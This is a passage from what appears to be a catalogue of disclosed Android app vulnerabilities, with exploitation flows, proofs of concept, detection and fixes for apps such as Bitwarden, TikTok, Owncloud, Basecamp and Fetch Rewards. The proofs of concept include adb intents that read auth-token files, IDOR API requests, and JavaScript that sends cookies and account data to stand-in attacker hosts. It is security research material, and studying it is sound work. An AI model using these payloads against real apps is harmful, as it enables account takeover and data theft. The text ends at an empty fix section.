**Affected Component:** LinkedIn Article iframe URL field (Package: `com.linkedin.android`)
**Severity:** High
**CVSS (estimated):** 7.0 (AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N)

### Root Cause
LinkedIn Article allows embedding JS payload in iframe URL field; payload executes in victim's mobile app context when article is opened.

### Attack Prerequisites
- Attacker can publish LinkedIn Articles
- Victim opens malicious article in LinkedIn app
- User interaction required (open article)

### Exploitation Flow
1. Attacker publishes article with malicious JS in iframe URL field
2. Victim opens article in LinkedIn mobile app
3. JS payload executes, steals session cookies or performs malicious actions

### Proof of Concept
- Publish article with iframe src containing JS payload: `javascript:alert(document.cookie)`
- Victim opens article, payload executes

### Impact
- XSS in LinkedIn app context: Steal session cookies, perform actions as victim
- Malicious payload affects all readers of the article

### Chain Potential
- Combine with VULN-009 (Cookie Leak) for session takeover
- Stored XSS has wider impact than reflected XSS

### Detection Strategy
- **Dynamic:** Test iframe URL field with JS payloads
- **Code Review:** Check URL validation for iframe sources

### Fix Recommendation
1. Sanitize iframe URL field to reject `javascript:` scheme
2. Validate URLs against allowlist of trusted domains
3. Encode output to prevent JS execution
4. Monitor published articles for malicious payloads

### Real-World References
- LinkedIn Security Advisory (Article Stored XSS)
- OWASP Mobile Top 10: M7 (Client Code Quality)

---

## [VULN-016] Bitwarden Biometric Bypass - Vault Access

**Category:** Authentication
**Affected Component:** Bitwarden Mobile App (Multi-Vault Biometric Unlock) (Package: `com.bitwarden.app`)
**Severity:** High
**CVSS (estimated):** 6.0 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

### Root Cause
Biometric integrity check (`BiometricIntegrityValid`) does not apply across multiple vaults; if secondary vault is unlocked with biometrics, primary vault (with new fingerprint enrolled) can be unlocked via secondary vault switch.

### Attack Prerequisites
- Physical access to victim's device (unlocked)
- Victim has enabled biometric unlock for Bitwarden
- Attacker has any valid Bitwarden account (including self-hosted)

### Exploitation Flow
1. Victim enrolls new fingerprint after primary vault is locked
2. Attacker unlocks secondary vault with biometrics (no new fingerprint required)
3. Attacker switches to primary vault from secondary vault
4. Biometric unlock works for primary vault despite new fingerprint

### Proof of Concept
1. Sign in to Bitwarden with primary account, enable biometric unlock, force kill app
2. Enroll new fingerprint
3. Add secondary account, enable biometric unlock, unlock it
4. Switch to primary vault, biometric unlock succeeds

### Impact
- Unauthorized vault access: View/delete all passwords
- Enable device login to gain desktop access
- Export not possible without master password, but password visibility is enough for harm

### Chain Potential
- Combine with physical device theft for full vault compromise
- If master password reuse: Credential stuffing on other sites

### Detection Strategy
- **Dynamic:** Test biometric unlock after enrolling new fingerprint across multiple vaults
- **Code Review:** Check if integrity checks apply globally across all vaults

### Fix Recommendation
1. Apply biometric integrity checks across all vaults, not per-vault
2. Require master password re-entry after new biometric enrollment
3. Invalidate all biometric sessions on new fingerprint enrollment

### Real-World References
- Bitwarden GitHub PR #1026, #1093 (Biometric Integrity)
- HackerOne Report (Bitwarden Biometric Bypass)

---

## [VULN-017] Pleo PKCE Missing + Custom Scheme Interception - Microsoft Account Takeover

**Category:** OAuth/Deep Link
**Affected Component:** Pleo App Microsoft Linking (Custom Scheme `msauth://`) (Package: `io.pleo.android`)
**Severity:** Critical
**CVSS (estimated):** 8.0 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

### Root Cause
OAuth flow for Microsoft account linking uses custom scheme `msauth://` without PKCE, no CSRF `state` param, custom scheme vulnerable to interception (rogue app registers same scheme before legit app).

### Attack Prerequisites
- Attacker app installed before legit Pleo app (Android first-come-first-served)
- Victim links Microsoft account to Pleo
- User interaction required (link account, select rogue app from chooser)

### Exploitation Flow
1. Attacker installs rogue app registering `msauth://` scheme
2. Victim links Microsoft account to Pleo, auth code sent to `msauth://`
3. Android shows chooser, victim selects rogue app (or iOS auto-selects rogue app)
4. Rogue app intercepts authorization code
5. Exchange code for access token (no PKCE verifier required)
6. Read victim's Microsoft emails, reset password, take over account

### Proof of Concept
```bash
# Intercepted auth code exchange (replace <AUTH_CODE>)
curl -i -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "client_id=a3f220d3-3491-4f29-9de5-a4bfa502d17a&code=<AUTH_CODE>&redirect_uri=msauth%3A%2F%2Fio.pleo.android..." \
  "https://login.microsoftonline.com/common/oauth2/v2.0/token"
```

### Impact
- **Critical:** Microsoft account takeover, read all emails
- Password reset via email access, full ATO
- Higher impact on iOS (no chooser dialog)

### Chain Potential
- Chain 1: Custom Scheme Deep Link -> Interception -> Missing PKCE -> Token Theft
- Link to VULN-008 (Scheme Hijacking) for similar patterns

### Detection Strategy
- **Static:** Check OAuth flow for `code_challenge` param (PKCE)
- **Dynamic:** Test custom scheme registration conflict with rogue app
- **Code Review:** Verify CSRF `state` param and PKCE implementation

### Fix Recommendation
1. Implement PKCE flow with `code_challenge` and `code_verifier`
2. Add CSRF `state` param to OAuth requests
3. Use Android App Links (HTTPS) instead of custom schemes
4. Use `react-native-app-auth` library for secure OAuth

### Real-World References
- HackerOne Report #F1562778 (Pleo Microsoft Takeover)
- OAuth PKCE Spec: https://auth0.com/docs/flows/pkce

---

## [VULN-018] TikTok Now IDOR - Private Memory Privacy Change

**Category:** IDOR (API)
**Affected Component:** API `POST /unification/privacy/item/modify/visibility/v1` (Package: `com.zhiliaoapp.musically`)
**Severity:** High
**CVSS (estimated):** 7.0 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)

### Root Cause
API endpoint uses `aweme_id` (memory ID) without authorization check; attacker can modify privacy settings of any memory if they know the ID.

### Attack Prerequisites
- Attacker has valid TikTok Now account
- Victim's private memory `aweme_id` (obtainable from victim's profile API response)
- No user interaction required (API call)

### Exploitation Flow
1. Attacker browses victim's TikTok Now profile, obtains private memory `aweme_id` from API response
2. Attacker sends API request with victim's `aweme_id` and `type=1` (Everyone) using their own auth cookie
3. Victim's private memory privacy changed to public
4. Attacker views victim's private memory

### Proof of Concept
```bash
# API Request (replace TARGET_AWEME_ID)
curl -X POST \
  "https://api16-normal-c-alisg.tiktokv.com/unification/privacy/item/modify/visibility/v1?aweme_id=TARGET_AWEME_ID&type=1" \
  -H "Cookie: [ATTACKER_COOKIE]"
```

### Impact
- **High:** Private memories made public without victim's consent
- Unauthorized privacy modification
- Affected all users with private memories

### Chain Potential
- Combine with `aweme_id` leak for mass privacy violations
- If combined with XSS: Automate privacy changes

### Detection Strategy
- **Dynamic:** Test API with `aweme_id` from different account
- **Code Review:** Check authorization checks for `aweme_id` ownership

### Fix Recommendation
1. Add authorization check: Verify `aweme_id` belongs to requesting user
2. Use server-side session to validate ownership, not just client-provided ID
3. Log all privacy changes for monitoring

### Real-World References
- HackerOne Report #XXXXX (TikTok Now IDOR, $5500 Bounty)
- OWASP Top 10: A01 (Broken Access Control)

---

## [VULN-019] TikTok Poll IDOR - Friends Only Poll Vote

**Category:** IDOR (API)
**Affected Component:** TikTok Poll Voting API (Package: `com.zhiliaoapp.musically`)
**Severity:** Medium
**CVSS (estimated):** 4.0 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)

### Root Cause
Poll voting API uses `vote_id` without authorization check; attacker can vote on any poll (including Friends Only) if they know the `vote_id`.

### Attack Prerequisites
- Attacker has valid TikTok account
- Poll `vote_id` (obtainable from poll sticker)
- No user interaction required (API call)

### Exploitation Flow
1. Attacker obtains `vote_id` from poll sticker
2. Attacker sends vote request with `vote_id` using their own auth cookie
3. Vote recorded on Friends Only poll without being friends

### Proof of Concept
```bash
# API Request (replace VOTE_ID)
curl -X POST \
  "https://api16-normal-c-alisg.tiktokv.com/poll/vote?vote_id=VOTE_ID" \
  -H "Cookie: [ATTACKER_COOKIE]"
```

### Impact
- Poll manipulation: Unauthorized voting on private polls
- Skew poll results, privacy violation

### Chain Potential
- Combine with `vote_id` leak for mass poll manipulation

### Detection Strategy
- **Dynamic:** Test poll vote with `vote_id` from different account
- **Code Review:** Check authorization for poll ownership

### Fix Recommendation
1. Add authorization check: Verify voter is friends with poll creator for Friends Only polls
2. Validate `vote_id` ownership server-side

### Real-World References
- TikTok Security Advisory (Poll IDOR)

---

## [VULN-020] Owncloud ReceiveExternalFilesActivity - Path Traversal/Arbitrary File Read/Write

**Category:** Path Traversal
**Affected Component:** `com.owncloud.android.ui.activity.ReceiveExternalFilesActivity` (Package: `com.owncloud.android`)
**Severity:** High
**CVSS (estimated):** 7.0 (AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

### Root Cause
Activity handles `android.intent.extra.STREAM` without proper path validation; allows bypass of `/data` path check via cache path or content provider URI. Also allows path traversal in `fileName` for plain text files (always `.txt` extension).

### Attack Prerequisites
- Attacker app installed on same device
- No permissions required

### Exploitation Flow
1. **Arbitrary File Read:** Send `STREAM` extra with `file://` URI containing `../` to traverse to shared_prefs or `content://org.owncloud.files` URI to access internal files
2. **Arbitrary File Write:** Send `android.intent.extra.TEXT` with `fileName=../shared_prefs/test` to write `.txt` file to internal storage

### Proof of Concept
```bash
# Read internal file (bypass fix)
adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity \
  -t "text/plain" -a "android.intent.action.SEND" \
  --eu "android.intent.extra.STREAM" "file:///data/user/0/com.owncloud.android.debug/cache/../shared_prefs/com.owncloud.android.debug_preferences.xml"

# Write arbitrary .txt file
adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity \
  -t "text/plain" -a "android.intent.action.SEND" \
  --es "android.intent.extra.TEXT" "Arbitrary contents" \
  --es "android.intent.extra.TITLE" "../shared_prefs/test"
```

### Impact
- Internal file disclosure: Read prefs, logs, sensitive files
- Arbitrary `.txt` file write to internal storage
- Data breach of app-private data

### Chain Potential
- Combine with file read to steal auth tokens, then ATO (see VULN-009, VULN-024)
- Combine with file write to inject malicious config files

### Detection Strategy
- **Static:** Fuzz `STREAM` extra with path traversal payloads
- **Dynamic:** Test plain text file write with traversal sequences
- **Code Review:** Check path validation for `..` and content provider URIs

### Fix Recommendation
1. Reject paths containing `..` or directory separators
2. Use allowlist of safe directories for file operations
3. Do not rely on replacing `../` (use proper path canonicalization)
4. Restrict `STREAM` to cache directory only

### Real-World References
- GitHub Security Lab Report GHSL-2022-059, GHSL-2022-060
- HackerOne Report #377107 (Owncloud Path Traversal)

---

## [VULN-021] Basecamp WebView - javascript: Injection + JS Bridge Data Exfiltration

**Category:** WebView
**Affected Component:** `com.basecamp.bc3` WebView (Package: `com.basecamp.bc3`)
**Severity:** Critical
**CVSS (estimated):** 8.0 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

### Root Cause
WebView handles deep links with no URL validation, allows `javascript:` scheme injection, exposes JS bridges (`nativeBridge`, `NativeApp`, `TurboNative`) with sensitive methods (get account name, bucket info, cookies).

### Attack Prerequisites
- Victim clicks malicious deep link
- User interaction required (click link)
- Attacker needs valid Basecamp account to initialize JS bridges

### Exploitation Flow
1. Attacker crafts deep link with `javascript:` payload to exfiltrate data via JS bridges:
   `javascript://3.basecamp.com/XXXXX/p","advance","---"); window.location.replace("https://example.com?exfil="+nativeBridge.getPage().accountName); //`
2. Victim clicks link, JS executes in WebView context
3. Sensitive data (account name, bucket, cookies) exfiltrated to attacker server

### Proof of Concept
```bash
# ADB Reproduce (replace XXXXX with user ID)
adb shell am start -W -a android.intent.action.VIEW \
  -d 'https://3.basecamp.com/XXXXX/p","advance","---"); window.location.replace("https://example.com?exfiltration="+nativeBridge.getPage().accountName); //'
```

### Impact
- **Critical:** Sensitive data exfiltration via JS bridges (account name, cookies, project data)
- JS bridge abuse for malicious actions
- XSS in app context

### Chain Potential
- Similar to VULN-009 (LinkedIn) JS bridge exfiltration pattern
- Combine with VULN-013 (Path Traversal) for full data breach

### Detection Strategy
- **Static:** Scan for JS bridge exposure in WebView classes
- **Dynamic:** Fuzz deep links with `javascript:` scheme
- **Code Review:** Check URL validation and JS bridge permissions

### Fix Recommendation
1. Reject `javascript:` scheme in URL validation
2. Restrict JS bridge methods to trusted origins
3. Minimize sensitive data exposed via JS bridges
4. Use allowlist of trusted domains for WebView loads

### Real-World References
- HackerOne Report #F1452715 (Basecamp JS Injection)
- OWASP Mobile Top 10: M7 (Client Code Quality)

---

## [VULN-022] Nextcloud PendingIntent Misconfiguration - Contacts Theft

**Category:** PendingIntent
**Affected Component:** Nextcloud Download Notification (Package: `com.nextcloud.client`)
**Severity:** High
**CVSS (estimated):** 6.0 (AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Root Cause
Download complete notification uses implicit PendingIntent (no package set, `FLAG_IMMUTABLE` not set); malicious app with `BIND_NOTIFICATION_LISTENER_SERVICE` can intercept PendingIntent, inherit Nextcloud's contacts permission, read contacts.

### Attack Prerequisites
- Malicious app with `BIND_NOTIFICATION_LISTENER_SERVICE` permission
- Nextcloud has contacts permission
- No user interaction required (runs in background)

### Exploitation Flow
1. Malicious app with notification listener permission intercepts PendingIntent from Nextcloud download notification
2. Modifies PendingIntent to read contacts (inherits Nextcloud's permission)
3. Contacts stolen without requesting contacts permission

### Proof of Concept
1. Install malicious app, grant notification listener permission
2. Download file in Nextcloud, trigger notification
3. Malicious app intercepts PendingIntent, reads contacts
4. Check logcat for stolen contacts: `adb logcat | grep sbn`

### Impact
- **High:** Contacts theft without requesting contacts permission
- Bypass permission model by inheriting target app's permissions
- Silent operation in background

### Chain Potential
- Combine with VULN-004 (Nextcloud DoS) to cover tracks
- Use stolen contacts for phishing/social engineering

### Detection Strategy
- **Static:** Check PendingIntent flags in notification code (use `FLAG_IMMUTABLE`)
- **Dynamic:** Test interception via notification listener app
- **Code Review:** Verify PendingIntent is explicit (set package name)

### Fix Recommendation
1. Set `PendingIntent.FLAG_IMMUTABLE` on all PendingIntents
2. Use explicit PendingIntent (set package name)
3. Avoid implicit intents in notifications

### Real-World References
- HackerOne Report #F1262742 (Nextcloud Contacts Theft)

---

## [VULN-023] Exness SurveyMonkey WebView - XSS + Cookie Theft

**Category:** WebView
**Affected Component:** `com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity` (Package: `com.exness.android.pa`)
**Severity:** Critical
**CVSS (estimated):** 8.0 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

### Root Cause
Activity exported, accepts `smSPageHTML` (HTML) and `smSPageURL` extras, loads HTML into WebView with JS enabled, no validation. Attacker creates symlink to Cookies file, loads as HTML, executes JS to exfiltrate payment system cookies.

### Attack Prerequisites
- Victim installs malicious app (PoC APK)
- Exness app installed on victim device
- User interaction required (open malicious app)

### Exploitation Flow
1. Malicious app creates symlink to Cookies file: `ln -s /data/data/com.exness.android.pa/app_webview/Cookies /data/data/pwn.pwn/pwn.html`
2. Send intent with `smSPageHTML` containing JS to exfiltrate cookies to attacker server
3. Load symlink as HTML, JS executes, cookies sent to attacker
4. Attacker uses stolen cookies to take over trading account

### Proof of Concept
```java
// Malicious App Intent
Intent steal = new Intent();
steal.setClassName("com.exness.android.pa", "com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity");
steal.putExtra("smSPageHTML", "<html><script>fetch('https://attacker.com?cookies='+document.cookie)</script></html>");
steal.putExtra("smSPageURL", "https://trade.mql5.com/r/");
startActivity(steal);
```

### Impact
- **Critical:** Payment system cookie theft (PayAnyWay, QIWI, Yandex Money, MQL5)
- Trading account takeover
- XSS in app context, JS executes with WebView permissions

### Chain Potential
- Similar to VULN-009 (Cookie Leak) but via symlink + HTML injection
- Combine with VULN-010 (javascript: XSS) for cross-app cookie theft

### Detection Strategy
- **Static:** Scan for exported activities accepting HTML extras
- **Dynamic:** Test file:// access to cookie files
- **Code Review:** Check WebView settings (JS enabled, file access)

### Fix Recommendation
1. Set `android:exported="false"` for SurveyMonkey activity
2. Validate and sanitize HTML extras before loading
3. Disable JS if not required: `setJavaScriptEnabled(false)`
4. Restrict file access: `setAllowFileAccess(false)`

### Real-World References
- HackerOne Report #F465510 (Exness Cookie Theft)

---

## [VULN-024] Didi WalletWebActivity - Arbitrary URL/LFI/XSS/ATO

**Category:** WebView
**Affected Component:** `com.didi.payment.base.view.webview.WalletWebActivity` (Package: `com.app99.driver`)
**Severity:** Critical
**CVSS (estimated):** 8.0 (AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Root Cause
Activity exported, accepts `URL` intent extra without validation, WebView allows `file://` access, JavaScript enabled, no restriction on URL schemes.

### Attack Prerequisites
- Attacker app installed on same device
- No permissions required

### Exploitation Flow
1. **Arbitrary URL Load:** `-e URL "https://evil.com"` loads phishing page in app context
2. **XSS:** Load page with JS payload executes in WebView
3. **LFI:** `-e URL "file:///data/data/com.app99.driver/shared_prefs/authToken.xml"` exposes auth token
4. **ATO:** Steal auth token, take over user account

### Proof of Concept
```bash
# Arbitrary URL
adb shell am start -n com.app99.driver/com.didi.payment.base.view.webview.WalletWebActivity -e URL "https://evil.com"

# LFI (expose auth token)
adb shell am start -n com.app99.driver/com.didi.payment.base.view.webview.WalletWebActivity -e URL "file:///data/data/com.app99.driver/shared_prefs/authToken.xml"
```

### Impact
- **Critical:** Auth token theft, full account takeover
- XSS, phishing in trusted app context
- Local file inclusion of sensitive app files
- Breaks app sandbox model

### Chain Potential
- Chain 1: Exported WebView Activity -> Arbitrary URL -> LFI -> Cookie/Token Theft -> ATO
- Link to VULN-009, VULN-023 for similar WebView cookie theft patterns

### Detection Strategy
- **Static:** Manifest scan for exported WebView activities accepting URL extra
- **Dynamic:** Fuzz URL param with `file://`, `javascript:` schemes
- **Code Review:** Check WebView settings and URL validation

### Fix Recommendation
1. Set `android:exported="false"` or add signature permission
2. Validate URL against allowlist of trusted domains
3. Disable `file://` access: `setAllowFileAccess(false)`
4. Disable JS if not required: `setJavaScriptEnabled(false)`
5. Use `WebView.enableSafeBrowsing()`

### Real-World References
- HackerOne Report #F5811976 (Didi WalletWebActivity ATO)
- OWASP Mobile Top 10: M7 (Client Code Quality)

## [VULN-025] Kwai Facebook OAuth Deep Link Hijacking via Unverified Custom URI Scheme

**Category:** OAuth / Deep Link Hijacking

**Affected Component:** `com.facebook.CustomTabActivity` (Package: `com.kwai.video`)

**Severity:** Critical

**CVSS (estimated):** 8.8 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

### Root Cause

The application uses an unverified custom URI scheme (`fb1797702170527735://`) as the Facebook OAuth callback mechanism. The scheme is not exclusively bound to the legitimate application and lacks Android App Links and Digital Asset Links verification.

As a result, any third-party Android application can register the same URI scheme and intercept sensitive authentication data during the Facebook login redirection flow.

Additionally, authentication data, including access tokens, is returned directly inside the deep link, exposing sensitive credentials to malicious applications.

### Attack Prerequisites

* Victim has the official `com.kwai.video` application installed.
* Victim installs a malicious Android application.
* Victim initiates Facebook login.
* User selects the malicious application when Android displays the application chooser.

### Exploitation Flow

1. The attacker creates a malicious Android application that registers the `fb1797702170527735://` URI scheme.
2. The victim installs both the official Kwai application and the malicious application.
3. The victim initiates Facebook authentication within the official application.
4. Facebook authentication completes successfully.
5. Android displays an application chooser for handling the redirect URI.
6. The victim is tricked into selecting the malicious application.
7. The malicious application intercepts the authentication callback and extracts sensitive authentication data.
8. The attacker reuses the intercepted token to impersonate the victim and gain unauthorized account access.

### Proof of Concept

```xml
<!-- AndroidManifest.xml (Malicious Application) -->

<intent-filter>
    <action android:name="android.intent.action.VIEW"/>

    <category android:name="android.intent.category.DEFAULT"/>

    <category android:name="android.intent.category.BROWSABLE"/>

    <data android:scheme="fb1797702170527735"/>
</intent-filter>
```

Observed authentication callback:

```text
fb1797702170527735://authorize/#granted_scopes=user_friends%2Cemail%2Cpublic_profile%2Cbasic_info&denied_scopes=&signed_request=...
```

Example intercepted token:

```text
EAAZAjAcDJRZ...
```

### Impact

* Interception of valid Facebook authentication tokens.
* Unauthorized account access without user credentials.
* Session hijacking and victim impersonation.
* Exposure of personally identifiable information (PII).
* Potential full account takeover depending on backend trust assumptions.

### Chain Potential

* Can be chained with OAuth token replay attacks.
* Can be combined with exported activity abuse.
* Can facilitate persistent session hijacking.
* Can be leveraged for large-scale account compromise through malicious applications.

### Detection Strategy

* **Static:** Scan for exported activities using custom URI schemes for authentication callbacks.
* **Dynamic:** Install a secondary application registering the same scheme and monitor OAuth redirections.
* **Code Review:** Identify usage of custom URI schemes instead of verified Android App Links and verify whether tokens are embedded in deep links.

### Fix Recommendation

1. Replace custom URI schemes with verified Android App Links (`https`) and enable `android:autoVerify="true"`.
2. Implement Digital Asset Links to bind authentication domains exclusively to the legitimate application.
3. Avoid returning access tokens via deep links; use short-lived authorization codes and perform token exchange server-side.
4. Bind authentication tokens to device or session context and invalidate intercepted tokens.
5. Implement strict backend validation to prevent token replay attacks.

### Real-World References

* Android App Links Security Best Practices
* Facebook Android SDK Authentication Flow
* OAuth 2.0 Security Best Current Practice (RFC 9700)
* Deep Link Hijacking Research (Android OAuth Redirect Interception)


## [VULN-026] Kwai WebView Deep Link Arbitrary URL Loading Leading to XSS

**Category:** WebView

**Affected Component:** `ikwai://webview` Deep Link Handler (Package: `com.kwai.kuaishou.video.live`)

**Severity:** High

**CVSS (estimated):** 8.1 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

### Root Cause

The application exposes an exported deep link (`ikwai://webview`) that accepts a user-controlled `url` parameter and loads it directly inside an in-app WebView without proper validation, domain restrictions, or sanitization.

Because arbitrary external content can be rendered inside the application's trusted WebView context, an attacker can execute JavaScript (XSS) and potentially abuse WebView privileges.

If JavaScript bridges (`addJavascriptInterface`) are exposed, the impact may escalate to full application compromise.

### Attack Prerequisites

* Victim has the official `com.kwai.kuaishou.video.live` application installed.
* Victim opens a malicious deep link or installs a malicious application.
* User interaction is required to trigger the deep link.

### Exploitation Flow

1. The attacker crafts a malicious URL hosted on an attacker-controlled server.
2. The attacker triggers the exported deep link `ikwai://webview`.
3. The application receives the attacker-controlled `url` parameter.
4. The WebView loads the external content without validation.
5. JavaScript executes inside the application's WebView context.
6. The attacker may steal sensitive data, perform phishing, or abuse exposed JavaScript interfaces.

### Proof of Concept

```bash
# Trigger vulnerable WebView

adb shell am start \
-a android.intent.action.VIEW \
-d "ikwai://webview?url=https://evil.com"
```

Controlled XSS payload:

```text
https://69c32c0d6875f1ed58e80fcb--transcendent-granita-4c9ad4.netlify.app/
```

Example malicious payload:

```html
<html>
<body>
<script>
alert(document.domain);

// Example exfiltration
fetch("https://attacker.com/log?data=" + document.cookie);
</script>
</body>
</html>
```

### Impact

* Arbitrary JavaScript execution (XSS) inside the application WebView.
* Phishing and UI spoofing within a trusted application context.
* Potential theft of session tokens or authentication data.
* Potential access to exposed WebView bridges.
* Possible escalation to full application compromise if `addJavascriptInterface` is present.

### Chain Potential

* Chain with exposed `addJavascriptInterface` implementations for code execution.
* Chain with authentication/session tokens loaded in WebView.
* Chain with exported activities for deeper application compromise.
* Chain with OAuth or SSO flows loaded inside WebView.

### Detection Strategy

* **Static:** Identify exported deep links that accept user-controlled URL parameters.
* **Dynamic:** Trigger `ikwai://webview` with external domains and monitor WebView behavior.
* **Code Review:** Verify WebView configurations (`setJavaScriptEnabled`, `addJavascriptInterface`, `shouldOverrideUrlLoading`, URL validation).

### Fix Recommendation

1. Implement a strict whitelist of trusted domains.
2. Reject arbitrary external URLs from deep links.
3. Validate and sanitize all Intent parameters before processing.
4. Disable JavaScript for untrusted content whenever possible.
5. Implement strict `shouldOverrideUrlLoading()` filtering.
6. Avoid loading attacker-controlled content inside application WebViews.

### Real-World References

* OWASP Mobile Top 10 - Insecure WebView Implementations
* Android WebView Security Best Practices
* Android Deep Link Security Guidance
* MASVS-PLATFORM (OWASP Mobile Application Security Verification Standard)


## [VULN-027] Fetch Rewards Deep Link Arbitrary WebView Loading Leading to XSS and Phishing

**Category:** WebView

**Affected Component:** `open_in_app_browser` Deep Link → `WebActivity` (Package: `com.fetchrewards.fetchrewards.hop`)

**Severity:** Critical

**CVSS (estimated):** 8.8 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

### Root Cause

The application exposes a custom deep link (`fetchrewards://open_in_app_browser`) that accepts a user-controlled `subAction` parameter and forwards it directly into an internal `WebActivity` without validating the destination URL, origin, or scheme.

Although `WebActivity` itself is not exported, the vulnerable deep link acts as an entry point that bypasses this protection and allows arbitrary attacker-controlled content to be rendered inside the application's trusted WebView context.

JavaScript is enabled inside the WebView, enabling XSS, phishing attacks, and potential abuse of WebView privileges.

### Attack Prerequisites

* Victim has the official `com.fetchrewards.fetchrewards.hop` application installed.
* Victim clicks a malicious deep link (SMS, email, QR code, browser, or web page).
* No root access or special Android permissions are required.
* No malicious application installation is required.

### Exploitation Flow

1. The attacker hosts a malicious webpage containing a crafted Fetch Rewards deep link.
2. The victim clicks the malicious link.
3. `SplashActivity` receives the deep link and forwards it to the deep link handler.
4. The `subAction` parameter is extracted without validation.
5. `WebActivity` is launched with attacker-controlled input through `WEBLINK_KEY`.
6. The application loads the attacker-controlled website inside its internal WebView.
7. JavaScript executes within the trusted application context.
8. The attacker can perform phishing attacks, steal data, or abuse exposed WebView functionality.

### Proof of Concept

Malicious HTML:

```html id="39gk6i"
<a href="fetchrewards://open_in_app_browser?subAction=https://attacker.com/fetch-login">
    Open Fetch App
</a>
```

ADB validation:

```bash id="eopd40"
adb shell am start \
-a android.intent.action.VIEW \
-d "fetchrewards://open_in_app_browser?subAction=https://dnelsaka.github.io/idkwebview/zipi.html"
```

Vulnerable code path:

```java id="ee2eqh"
Intent intent = new Intent(lifeCycleOwner, WebActivity.class);

intent.putExtra("WEBLINK_KEY", link);

lifeCycleOwner.startActivity(intent);
```

`link` is directly populated from the user-controlled `subAction` parameter without validation.

### Impact

* Arbitrary JavaScript execution (XSS) inside the application WebView.
* Credential phishing within a trusted application context.
* Session cookie theft for websites loaded inside the WebView.
* OAuth authorization code interception.
* Theft of sensitive user information.
* UI spoofing and social engineering attacks.
* Potential escalation to full application compromise if JavaScript bridges are exposed.

### Chain Potential

* Chain with exposed `addJavascriptInterface` implementations.
* Chain with OAuth flows rendered inside WebView.
* Chain with session cookies stored by the WebView.
* Chain with other deep link vulnerabilities for persistent account compromise.

### Detection Strategy

* **Static:** Identify deep links forwarding user-controlled parameters into WebView components.
* **Dynamic:** Trigger `fetchrewards://open_in_app_browser` with external domains and observe WebView behavior.
* **Code Review:** Trace deep link parameters to `WEBLINK_KEY` and inspect WebView security settings (`setJavaScriptEnabled`, `addJavascriptInterface`, URL validation).

### Fix Recommendation

1. Implement a strict whitelist for trusted domains.
2. Reject arbitrary external URLs from deep links.
3. Validate and sanitize all deep link parameters before processing.
4. Disable JavaScript for untrusted content whenever possible.
5. Implement strict URL filtering inside `shouldOverrideUrlLoading()`.
6. Avoid passing user-controlled input directly into WebView components.
7. Consider migrating external content to Android App Links with verified domains.

### Real-World References

* OWASP Mobile Top 10 - Insecure WebView Implementations
* Android WebView Security Best Practices
* Android Deep Link Security Guidance
* MASVS-PLATFORM (OWASP Mobile Application Security Verification Standard)

## [VULN-028] Fetch Rewards Exported OAuth Activity Arbitrary URI Injection Leading to Open Redirect and Intent Abuse

**Category:** Intent Injection

**Affected Component:** `com.fetch.ereceipts.feature.views.activities.EreceiptOAuthActivity` (Package: `com.fetchrewards.fetchrewards.hop`)

**Severity:** High

**CVSS (estimated):** 7.8 (AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N)

### Root Cause

The application exposes an exported OAuth activity that accepts externally supplied parameters (`session_id`, `provider_id`, and `url`) and directly passes the user-controlled `url` parameter into an Intent without performing any validation.

The application does not restrict URI schemes, hosts, or destinations before invoking `startActivity()`. As a result, attackers can inject arbitrary URIs and force the application to interact with external websites or system components.

This vulnerability enables open redirect behavior, arbitrary intent launching, and abuse of trusted application context.

### Attack Prerequisites

* Victim has the official `com.fetchrewards.fetchrewards.hop` application installed.
* No root access is required.
* No special Android permissions are required.
* An attacker can trigger the exported activity via a malicious application, ADB, or crafted links.

### Exploitation Flow

1. The attacker invokes `EreceiptOAuthActivity` with attacker-controlled parameters.
2. The application extracts the `url` parameter.
3. The application parses the URI without validation.
4. The URI is assigned directly to an Intent object.
5. `startActivity()` is executed with attacker-controlled input.
6. The victim application launches arbitrary destinations, including external websites or system components.

### Proof of Concept

Open attacker-controlled website:

```bash id="14b0ur"
adb shell am start \
-n com.fetchrewards.fetchrewards.hop/com.fetch.ereceipts.feature.views.activities.EreceiptOAuthActivity \
--es session_id 123 \
--es provider_id google \
--es url "https://evil.com"
```

Trigger a system component:

```bash id="g3jqu7"
adb shell am start \
-n com.fetchrewards.fetchrewards.hop/com.fetch.ereceipts.feature.views.activities.EreceiptOAuthActivity \
--es session_id 123 \
--es provider_id google \
--es url "content://com.android.contacts"
```

Vulnerable code:

```java id="6i6bzn"
Uri uri = Uri.parse(string3);

Intent intent = eVar.f113867a;

intent.setData(uri);

startActivity(intent, eVar.f113868b);
```

### Impact

* Open redirect to attacker-controlled domains.
* Arbitrary URI injection.
* Unauthorized interaction with Android system components.
* Abuse of trusted application context for phishing and social engineering.
* Potential exposure of sensitive user interfaces.
* Increased risk of data leakage when chained with overlay or tapjacking attacks.

### Chain Potential

* Chain with tapjacking or overlay attacks.
* Chain with phishing campaigns using trusted application context.
* Chain with exported components for deeper application compromise.
* Chain with additional permission abuse vulnerabilities.
* Chain with sensitive URI handlers exposed by the operating system.

### Detection Strategy

* **Static:** Identify exported activities that pass user-controlled input into `Intent.setData()`.
* **Dynamic:** Supply arbitrary URI schemes (`https://`, `content://`, `tel://`, `intent://`) and monitor application behavior.
* **Code Review:** Trace untrusted Intent extras to `Uri.parse()` and `startActivity()` sinks.

### Fix Recommendation

